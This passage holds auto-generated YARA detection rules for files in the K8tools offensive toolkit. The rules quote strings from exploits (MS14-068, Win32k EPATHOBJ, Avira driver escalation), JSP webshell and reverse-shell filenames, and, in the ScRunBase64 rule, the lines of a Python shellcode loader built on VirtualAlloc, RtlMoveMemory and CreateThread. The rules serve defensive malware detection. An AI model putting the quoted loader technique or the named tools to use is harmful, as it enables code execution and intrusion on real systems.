      $s15 = "MS14068 EXP\\pyasn1\\codec\\der\\decoder.py" fullword ascii /* score: '6.03'*/
      $s16 = "class ValueConstraintError(PyAsn1Error): pass" fullword ascii /* score: '6.00'*/
      $s17 = "6z*cmd" fullword ascii /* score: '6.00'*/
      $s18 = "MS14068 EXP\\ms14-068.py" fullword ascii /* score: '5.42'*/
      $s19 = "3S%a%<k7w" fullword ascii /* score: '5.00'*/
      $s20 = "MS14068 EXP\\pyasn1iJt" fullword ascii /* score: '4.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

rule K8_____________________ {
   meta:
      description = "K8tools - file K8数字签名添加器.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "23bcad4c1d3e1007e722582b1ff5ca373f78d2503a5d1b9a1907cfba47e6ed95"
   strings:
      $s1 = "vgdi32.dll" fullword ascii /* score: '23.00'*/
      $s2 = "it's infected by a Virus or cracked. This file won't work anymore." fullword ascii /* score: '9.00'*/
      $s3 = "A debugger has been found running in your system." fullword ascii /* score: '7.00'*/
      $s4 = "]dI:\\]YR" fullword ascii /* score: '7.00'*/
      $s5 = "l+ JG," fullword ascii /* score: '5.00'*/
      $s6 = "m%jX%&" fullword ascii /* score: '5.00'*/
      $s7 = "Eh%X%3VX" fullword ascii /* score: '5.00'*/
      $s8 = "t}Z%k%" fullword ascii /* score: '5.00'*/
      $s9 = "ojnd\"i%QWo" fullword ascii /* score: '4.42'*/
      $s10 = "N(File corrupted!. This program has been manipulated and maybe" fullword ascii /* score: '4.00'*/
      $s11 = "Please, unload it from memory and restart your program." fullword ascii /* score: '4.00'*/
      $s12 = "SP_PRIORYEAR" fullword wide /* score: '4.00'*/
      $s13 = "mmPm?\"" fullword ascii /* score: '4.00'*/
      $s14 = "/lbYc=KUe" fullword ascii /* score: '4.00'*/
      $s15 = "NYACf&K" fullword ascii /* score: '4.00'*/
      $s16 = "auyUFoU" fullword ascii /* score: '4.00'*/
      $s17 = "s6.rDM" fullword ascii /* score: '4.00'*/
      $s18 = "0uDjeptIK" fullword ascii /* score: '4.00'*/
      $s19 = "VeWRVc`B" fullword ascii /* score: '4.00'*/
      $s20 = "wdNZxB]" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      ( pe.imphash() == "afd72d505d69a3462e1af9145d16b7d3" or 8 of them )
}

rule __________Avira_avipbb_sys_______Exploit_1024_K8_ {
   meta:
      description = "K8tools - file 小红伞 Avira avipbb.sys 提权Exploit_1024[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a9c24892ca32dc5da2eb0559bafb79a9f09fa1cd91862982ca0b72b531a28726"
   strings:
      $x1 = "Exploit[K8team]\\cmd.exe" fullword ascii /* score: '33.42'*/
      $s2 = "Exploit[K8team]\\mfc100u.dll" fullword ascii /* score: '24.42'*/
      $s3 = "Exploit[K8team]\\exploit.exe" fullword ascii /* score: '19.42'*/
      $s4 = "Avira avipbb.sys " fullword ascii /* score: '11.42'*/
      $s5 = ".sys( " fullword ascii /* score: '8.42'*/
      $s6 = "Exploit[K8team]\\" fullword ascii /* score: '8.00'*/
      $s7 = "Exploit[K8team]" fullword ascii /* score: '8.00'*/
      $s8 = "L:\")J<" fullword ascii /* score: '7.00'*/
      $s9 = "5- n(1" fullword ascii /* score: '5.00'*/
      $s10 = "ucbhyy" fullword ascii /* score: '5.00'*/
      $s11 = "vTHX;h{_<J" fullword ascii /* score: '4.00'*/
      $s12 = "mXqb:5I" fullword ascii /* score: '4.00'*/
      $s13 = "{RufQ9Bynn" fullword ascii /* score: '4.00'*/
      $s14 = ";GZZwWyG@" fullword ascii /* score: '4.00'*/
      $s15 = "~foXJ!" fullword ascii /* score: '4.00'*/
      $s16 = "~~J+.GKX" fullword ascii /* score: '4.00'*/
      $s17 = "M\\rFPZR>Z" fullword ascii /* score: '4.00'*/
      $s18 = "paHXZOM" fullword ascii /* score: '4.00'*/
      $s19 = "4VDAy)5;" fullword ascii /* score: '4.00'*/
      $s20 = "eBBXOH_Z" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule K8tools_K8getPC {
   meta:
      description = "K8tools - file K8getPC.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ef154db9e7f5e393b9ae921902ad65d4ad5b3ba835d345c0ef46ae49a2bcb69f"
   strings:
      $s1 = "#https://www.cnblogs.com/k8gege" fullword ascii /* score: '22.00'*/
      $s2 = "5c4d41494c534c4f545c42524f575345" ascii /* score: '19.00'*/ /* hex encoded string '\MAILSLOT\BROWSE' */
      $s3 = "#https://github.com/k8gege/K8tools" fullword ascii /* score: '17.00'*/
      $s4 = "5c4d41494c534c4f545c42524f57534500" ascii /* score: '17.00'*/ /* hex encoded string '\MAILSLOT\BROWSE' */
      $s5 = "617574686F723A206B3867656765" ascii /* score: '17.00'*/ /* hex encoded string 'author: k8gege' */
      $s6 = "# -*- coding: UTF-8 -*-" fullword ascii /* score: '16.00'*/
      $s7 = "print packet.getlayer(IP).src+\"\\t\"+packet.src+\"\\t\"+osname.decode('hex')+\"\\t[\"+getver(osver)+\"]\"" fullword ascii /* score: '14.00'*/
      $s8 = "print packet.getlayer(IP).src+\"\\t\"+packet.src+\"\\t\"+osname.decode('hex')+\"\\t[Domain]\"" fullword ascii /* score: '14.00'*/
      $s9 = "import queue" fullword ascii /* score: '9.00'*/
      $s10 = "def getver(data):" fullword ascii /* score: '9.00'*/
      $s11 = "#print \"data:  \" + data" fullword ascii /* score: '8.00'*/
      $s12 = "return data[i+len(key)+12:i+len(key)+42],masterType,data[i+len(key)+44:i+len(key)+48] " fullword ascii /* score: '7.42'*/
      $s13 = "masterType = data[i+len(key):i+len(key)+2]" fullword ascii /* score: '7.17'*/
      $s14 = "i=data.find(key)" fullword ascii /* score: '7.00'*/
      $s15 = "#author: k8gege" fullword ascii /* score: '7.00'*/
      $s16 = "return data[i+len(key)+4:i+len(key)+34],masterType,data[i+len(key)+44:i+len(key)+48]" fullword ascii /* score: '7.00'*/
      $s17 = "def search(data, key):" fullword ascii /* score: '7.00'*/
      $s18 = "from scapy.all import *" fullword ascii /* score: '6.00'*/
      $s19 = "sniff(iface = sys.argv[1],filter=\"\", prn=packet_callbacke)" fullword ascii /* score: '5.01'*/
      $s20 = "return \"Win2003\"" fullword ascii /* score: '4.17'*/
   condition:
      uint16(0) == 0x2023 and filesize < 4KB and
      8 of them
}

rule pre_receive {
   meta:
      description = "K8tools - file pre-receive.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a4c3d2b9c7bb3fd8d1441c31bd4ee71a595d66b44fcf49ddb310252320169989"
   strings:
      $s1 = "# An example hook script to make use of push options." fullword ascii /* score: '14.00'*/
      $s2 = "if test -n \"$GIT_PUSH_OPTION_COUNT\"" fullword ascii /* score: '12.00'*/
      $s3 = "while test \"$i\" -lt \"$GIT_PUSH_OPTION_COUNT\"" fullword ascii /* score: '8.00'*/
      $s4 = "# and rejects all pushes when the \"reject\" push option is used." fullword ascii /* score: '8.00'*/
      $s5 = "# To enable this hook, rename this file to \"pre-receive\"." fullword ascii /* score: '8.00'*/
      $s6 = "# The example simply echoes all push options that start with 'echoback='" fullword ascii /* score: '8.00'*/
      $s7 = "i=$((i + 1))" fullword ascii /* score: '5.00'*/
      $s8 = "echo \"echo from the pre-receive-hook: ${value#*=}\" >&2" fullword ascii /* score: '4.00'*/
      $s9 = "eval \"value=\\$GIT_PUSH_OPTION_$i\"" fullword ascii /* score: '4.00'*/
      $s10 = "echoback=*)" fullword ascii /* score: '4.00'*/
      $s11 = "reject)" fullword ascii /* score: '4.00'*/
      $s12 = "case \"$value\" in" fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      8 of them
}

rule k8_SSH_Manage {
   meta:
      description = "K8tools - file k8_SSH_Manage.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6755adf9b2ef8ac901c669fb6836f9e6352b5be8e74841c77950b434f82f6ab9"
   strings:
      $s1 = "SSHmanage.exe" fullword wide /* score: '22.00'*/
      $s2 = "constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "CFb9.ULwuq;7" fullword ascii /* score: '7.00'*/
      $s4 = "PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" fullword ascii /* score: '6.50'*/
      $s5 = "- >tBPd" fullword ascii /* score: '5.00'*/
      $s6 = "VQ /W_d" fullword ascii /* score: '5.00'*/
      $s7 = "_a+ ^w0" fullword ascii /* score: '5.00'*/
      $s8 = "+iqJbJA0\"`" fullword ascii /* score: '4.42'*/
      $s9 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s10 = "D$<RSP" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "s~.ZfK'" fullword ascii /* score: '4.00'*/
      $s12 = "_CmDHl5" fullword ascii /* score: '4.00'*/
      $s13 = "L$PQSV" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "LiewJ4g" fullword ascii /* score: '4.00'*/
      $s15 = "5{Wepg>j+" fullword ascii /* score: '4.00'*/
      $s16 = "lHfuxq.5" fullword ascii /* score: '4.00'*/
      $s17 = "Vsly;G.o%" fullword ascii /* score: '4.00'*/
      $s18 = "aOKC4[F" fullword ascii /* score: '4.00'*/
      $s19 = "|uFJm:hvJzENtqc" fullword ascii /* score: '4.00'*/
      $s20 = "XCqm,lm" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "bf5a4aa99e5b160f8521cadd6bfe73b8" or 8 of them )
}

rule Windows_Win32k_sys_EPATHOBJ_0day_Exploit_______________K8team_ {
   meta:
      description = "K8tools - file Windows Win32k.sys EPATHOBJ 0day Exploit 提权工具 [K8team].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c1b38d82a1bda62163c81c9fccd272e2c2713cdcbd0ee04afc41a2df54cf1859"
   strings:
      $s1 = "[K8team]\\Release\\EPATHOBJ.exe" fullword ascii /* score: '17.17'*/
      $s2 = "[K8team]\\Debug\\EPATHOBJ.exe" fullword ascii /* score: '17.00'*/
      $s3 = "Windows Win32k.sys EPATHOBJ 0day Exploit " fullword ascii /* score: '15.00'*/
      $s4 = "[K8team]\\K8cmd.bat" fullword ascii /* score: '14.42'*/
      $s5 = "OOtfU#E " fullword ascii /* score: '4.42'*/
      $s6 = "[K8team]\\Release" fullword ascii /* score: '4.42'*/
      $s7 = "[K8team]\\Debug" fullword ascii /* score: '4.00'*/
      $s8 = "fsHSdK%" fullword ascii /* score: '4.00'*/
      $s9 = "nuim6:gj" fullword ascii /* score: '4.00'*/
      $s10 = "BmAjg9" fullword ascii /* score: '2.00'*/
      $s11 = "&Vvv " fullword ascii /* score: '1.42'*/
      $s12 = "V Wk=;" fullword ascii /* score: '1.00'*/
      $s13 = "? l#+0" fullword ascii /* score: '1.00'*/
      $s14 = "2D/G)>(z^V3<.g" fullword ascii /* score: '1.00'*/
      $s15 = "Gq;4z8" fullword ascii /* score: '1.00'*/
      $s16 = "tHY:#k|" fullword ascii /* score: '1.00'*/
      $s17 = ">|5<q*" fullword ascii /* score: '1.00'*/
      $s18 = "jL `%9" fullword ascii /* score: '1.00'*/
      $s19 = "^.C2M_" fullword ascii /* score: '1.00'*/
      $s20 = "9/esiI" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 100KB and
      8 of them
}

rule JspShellExec_1124_5BK_8_5D {
   meta:
      description = "K8tools - file JspShellExec_1124%5BK.8%5D.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "9f965aad49c8961531fbd22ef3aa052e93d07420a22ec0e79acd0d10fd24edc1"
   strings:
      $s1 = "JspShellExec\\JspShellExec.exe" fullword ascii /* score: '29.42'*/
      $s2 = "JspShellExec\\cmdline.PNG" fullword ascii /* score: '24.42'*/
      $s3 = "JspShellExec" fullword ascii /* score: '18.00'*/
      $s4 = "+ ''Lr" fullword ascii /* score: '5.00'*/
      $s5 = "5|uzeW#!~" fullword ascii /* score: '4.00'*/
      $s6 = "/Luch!1" fullword ascii /* score: '4.00'*/
      $s7 = "\\HKb#!0U" fullword ascii /* score: '2.00'*/
      $s8 = "\\w&7:gt" fullword ascii /* score: '2.00'*/
      $s9 = ",RhW.Zk" fullword ascii /* score: '1.00'*/
      $s10 = ".8T<O#" fullword ascii /* score: '1.00'*/
      $s11 = "F{-p19b" fullword ascii /* score: '1.00'*/
      $s12 = "e+]vf'" fullword ascii /* score: '1.00'*/
      $s13 = "+,R'k1" fullword ascii /* score: '1.00'*/
      $s14 = "aJB%0W" fullword ascii /* score: '1.00'*/
      $s15 = "s>ND-0" fullword ascii /* score: '1.00'*/
      $s16 = "*7b=2O;" fullword ascii /* score: '1.00'*/
      $s17 = "a34{:x" fullword ascii /* score: '1.00'*/
      $s18 = "bsS@\"T" fullword ascii /* score: '1.00'*/
      $s19 = "NS@%p4" fullword ascii /* score: '1.00'*/
      $s20 = "u5klV\\" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 60KB and
      8 of them
}

rule Drupal_7_31_SQL________________________________________________1017_K8_ {
   meta:
      description = "K8tools - file Drupal 7.31 SQL注入漏洞  修改管理员用户名和密码_1017[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "69afe35a44ea1b18a94fc4b3774021aa18e38dfc5330c92a9ff113200f29553c"
   strings:
      $s1 = "KUBINIC" fullword ascii /* score: '9.50'*/
      $s2 = "* T0>J8" fullword ascii /* score: '9.00'*/
      $s3 = "Vfnc%e%8" fullword ascii /* score: '8.00'*/
      $s4 = "nwetnft" fullword ascii /* score: '8.00'*/
      $s5 = "hVL.PKw" fullword ascii /* score: '7.00'*/
      $s6 = "M:>aR:\"" fullword ascii /* score: '7.00'*/
      $s7 = "*R:\"#5" fullword ascii /* score: '7.00'*/
      $s8 = "$_M:\"O" fullword ascii /* score: '7.00'*/
      $s9 = "CMDiJV,;y" fullword ascii /* score: '7.00'*/
      $s10 = "j2`w:\"" fullword ascii /* score: '7.00'*/
      $s11 = "gHLQT^.euC" fullword ascii /* score: '7.00'*/
      $s12 = "COBGNAS" fullword ascii /* score: '6.50'*/
      $s13 = "\\iPR- " fullword ascii /* score: '6.42'*/
      $s14 = "8ea_VFTP#" fullword ascii /* score: '6.00'*/
      $s15 = "IRC2 \\" fullword ascii /* score: '6.00'*/
      $s16 = ".3p0c8fE" fullword ascii /* score: '6.00'*/
      $s17 = "?S8NirC" fullword ascii /* score: '6.00'*/
      $s18 = "\\* Cl7" fullword ascii /* score: '6.00'*/
      $s19 = "eYEf&'" fullword ascii /* score: '6.00'*/
      $s20 = ",7nYL- " fullword ascii /* score: '5.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 23000KB and
      8 of them
}

rule K8_DNN_Password_Decrypt_20161110 {
   meta:
      description = "K8tools - file K8_DNN_Password_Decrypt_20161110.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7b1f18319e13e4c437a2722b0f2eb62ba83bcb75210e3aab38d007fd4894aab0"
   strings:
      $s1 = "K8_DNN_Password_Decrypt.exeLT" fullword ascii /* score: '18.01'*/
      $s2 = "TbP:\"W" fullword ascii /* score: '7.00'*/
      $s3 = "SLaOrKB#\"i" fullword ascii /* score: '4.00'*/
      $s4 = "pfCvqUU" fullword ascii /* score: '4.00'*/
      $s5 = "s`.ksn" fullword ascii /* score: '4.00'*/
      $s6 = "KUjMqpXt" fullword ascii /* score: '4.00'*/
      $s7 = "=*zxwS2VY" fullword ascii /* score: '4.00'*/
      $s8 = "g.WaV]" fullword ascii /* score: '4.00'*/
      $s9 = "2gqDW\"d[" fullword ascii /* score: '4.00'*/
      $s10 = "esjY\"l" fullword ascii /* score: '4.00'*/
      $s11 = "cbvsC)Cn" fullword ascii /* score: '4.00'*/
      $s12 = "TmiQ{8Z" fullword ascii /* score: '4.00'*/
      $s13 = "Qmiocu" fullword ascii /* score: '3.00'*/
      $s14 = "auGd56" fullword ascii /* score: '2.00'*/
      $s15 = "yxBdH9" fullword ascii /* score: '2.00'*/
      $s16 = "\\:`tX)" fullword ascii /* score: '2.00'*/
      $s17 = "xnVCo " fullword ascii /* score: '1.42'*/
      $s18 = "o)~4B " fullword ascii /* score: '1.42'*/
      $s19 = "etY&! " fullword ascii /* score: '1.42'*/
      $s20 = "p,'a O" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 500KB and
      8 of them
}

rule ______99____JspShell______S2______________________K8 {
   meta:
      description = "K8tools - file 网上99%的JspShell以极S2下的兼容性报告_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d623bba7b3569d799004ea70702e92a414506ec5fc82fdc7f0ff24014fcbcdc9"
   strings:
      $s1 = "_K8\\JSP\\Java Shell.jsp" fullword ascii /* score: '15.17'*/
      $s2 = "_K8\\JSP\\other\\download.jsp" fullword ascii /* score: '13.00'*/
      $s3 = "_K8\\JSP\\other\\jspspy.jsp" fullword ascii /* score: '12.00'*/
      $s4 = "_K8\\JSP\\other\\jspspy_k8.jsp" fullword ascii /* score: '12.00'*/
      $s5 = "_K8\\JSP\\JspWebshell 1.2.jsp" fullword ascii /* score: '12.00'*/
      $s6 = "_K8\\JSP\\cmdjsp.jsp" fullword ascii /* score: '10.17'*/
      $s7 = "_K8\\jsp2\\cmdjsp.jsp" fullword ascii /* score: '10.17'*/
      $s8 = "_K8\\jsp2\\cmd.jsp" fullword ascii /* score: '9.17'*/
      $s9 = "_K8\\JSP\\minupload.jsp" fullword ascii /* score: '9.17'*/
      $s10 = "JspShell" fullword ascii /* score: '9.00'*/
      $s11 = "_K8.txt" fullword ascii /* score: '8.00'*/
      $s12 = "_K8\\jsp2\\jsp-reverse.jsp" fullword ascii /* score: '7.17'*/
      $s13 = "_K8\\jsp2\\browser.jsp" fullword ascii /* score: '7.17'*/
      $s14 = "_K8\\jsp2\\CmdServlet.java" fullword ascii /* score: '7.17'*/
      $s15 = "_K8\\JSP\\jsp-reverse.jsp" fullword ascii /* score: '7.17'*/
      $s16 = "_K8\\JSP\\Customize.jsp" fullword ascii /* score: '7.17'*/
      $s17 = "_K8\\jsp2\\win32\\cmd_win32.jsp" fullword ascii /* score: '7.07'*/
      $s18 = "_K8\\JSP\\other\\thx.jsp" fullword ascii /* score: '7.00'*/
      $s19 = "_K8\\jsp2\\list.jsp" fullword ascii /* score: '7.00'*/
      $s20 = "jsp.rar" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 900KB and
      8 of them
}

rule K8______________________20190301_K8_ {
   meta:
      description = "K8tools - file K8吉他谱搜索工具_20190301[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d0b95a5958d4ae638c708a8ff34e64cb698568319992954816119e1c5df098c3"
   strings:
      $s1 = "\\K8skin.DLL" fullword ascii /* score: '21.00'*/
      $s2 = "\\_%d%>7" fullword ascii /* score: '9.00'*/
      $s3 = "\\tools\\piano.swf" fullword ascii /* score: '8.42'*/
      $s4 = "\\tools\\Beats.swf" fullword ascii /* score: '8.42'*/
      $s5 = "\\tools\\GuitarTuning.swf" fullword ascii /* score: '8.42'*/
      $s6 = "\\tools\\Lips.swf" fullword ascii /* score: '8.42'*/
      $s7 = "- aDQz{cq" fullword ascii /* score: '8.00'*/
      $s8 = "/]00QqH:\"e(" fullword ascii /* score: '7.42'*/
      $s9 = "n^ij:\\&" fullword ascii /* score: '7.00'*/
      $s10 = "NfJ.DJO" fullword ascii /* score: '7.00'*/
      $s11 = "BT:\\/:O" fullword ascii /* score: '7.00'*/
      $s12 = "'6$fZ\\.\\T" fullword ascii /* score: '6.00'*/
      $s13 = "wA1H$Q* " fullword ascii /* score: '5.42'*/
      $s14 = "- S)\"o}`" fullword ascii /* score: '5.00'*/
      $s15 = "5Wv- ;" fullword ascii /* score: '5.00'*/
      $s16 = ") -nc~p" fullword ascii /* score: '5.00'*/
      $s17 = "\\k8qqkiss.skin" fullword ascii /* score: '5.00'*/
      $s18 = "Jo /uF9" fullword ascii /* score: '5.00'*/
      $s19 = "ewokYv5" fullword ascii /* score: '5.00'*/
      $s20 = "tOgqtd6" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule ScRunBase64 {
   meta:
      description = "K8tools - file ScRunBase64.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e174e98a8c9c3b6380422cfd577f4a05b9387e842a1717a4bf0e55d4ec04848f"
   strings:
      $s1 = "wQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI" ascii /* base64 encoded string 'AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C52' */ /* score: '23.00'*/
      $s2 = "5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUE" ascii /* base64 encoded string '63F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA' */ /* score: '20.00'*/
      $s3 = "0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkN" ascii /* base64 encoded string 'DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922C' */ /* score: '20.00'*/
      $s4 = "ctypes.c_int(len(shellcode))," fullword ascii /* score: '18.00'*/
      $s5 = "ctypes.c_int(len(shellcode)))" fullword ascii /* score: '18.00'*/
      $s6 = "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)" fullword ascii /* score: '18.00'*/
      $s7 = "shellcode=bytearray(base64.b64decode(sys.argv[1]).decode(\"hex\"))" fullword ascii /* score: '18.00'*/
      $s8 = "#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA" ascii /* base64 encoded string 'DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4' */ /* score: '17.00'*/
      $s9 = "#calc.exe" fullword ascii /* score: '15.00'*/
      $s10 = "#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA" ascii /* base64 encoded string 'DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00' */ /* score: '14.00'*/
      $s11 = "CRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==" fullword ascii /* base64 encoded string 'E074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4' */ /* score: '14.00'*/
      $s12 = "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr)," fullword ascii /* score: '12.00'*/
      $s13 = "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0)," fullword ascii /* score: '12.00'*/
      $s14 = "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))" fullword ascii /* score: '12.00'*/
      $s15 = "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0)," fullword ascii /* score: '9.00'*/
      $s16 = "ctypes.pointer(ctypes.c_int(0)))" fullword ascii /* score: '7.00'*/
      $s17 = "#scrun by k8gege" fullword ascii /* score: '7.00'*/
      $s18 = "ctypes.c_int(ptr)," fullword ascii /* score: '4.00'*/
      $s19 = "ctypes.c_int(0)," fullword ascii /* score: '4.00'*/
      $s20 = "ctypes.c_int(0x3000)," fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7323 and filesize < 5KB and
      8 of them
}

rule K8tools__git_config {
   meta:
      description = "K8tools - file config"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "893956e508edb085eea034325c9cfbd231fd47c485efb9baa3118cce80cc33b9"
   strings:
      $s1 = "url = https://github.com/k8gege/K8tools" fullword ascii /* score: '17.00'*/
      $s2 = "fetch = +refs/heads/*:refs/remotes/origin/*" fullword ascii /* score: '12.17'*/
      $s3 = "merge = refs/heads/master" fullword ascii /* score: '9.17'*/
      $s4 = "logallrefupdates = true" fullword ascii /* score: '9.00'*/
      $s5 = "[remote \"origin\"]" fullword ascii /* score: '7.07'*/
      $s6 = "repositoryformatversion = 0" fullword ascii /* score: '7.00'*/
      $s7 = "remote = origin" fullword ascii /* score: '7.00'*/
      $s8 = "[branch \"master\"]" fullword ascii /* score: '4.07'*/
      $s9 = "bare = false" fullword ascii /* score: '4.00'*/
      $s10 = "filemode = true" fullword ascii /* score: '4.00'*/
      $s11 = "[core]" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x635b and filesize < 1KB and
      8 of them
}

rule ScRunBase64_2 {
   meta:
      description = "K8tools - file ScRunBase64.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s9 = "bScRunBase64.exe.manifest" fullword ascii /* score: '17.00'*/
      $s10 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PySys_SetObject" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for Py_DontWriteBytecodeFlag" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PyEval_EvalCode" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for Py_FrozenFlag" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_SetPath" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PyDict_GetItemString" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PySys_AddWarnOption" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PyImport_ImportModule" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule K8______ASP_________ {
   meta:
      description = "K8tools - file K8迷你ASP服务器.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ff9bba6a7b6859f278ad7be5ec12011256d4de9aa50a212df5952420a4862aa4"
   strings:
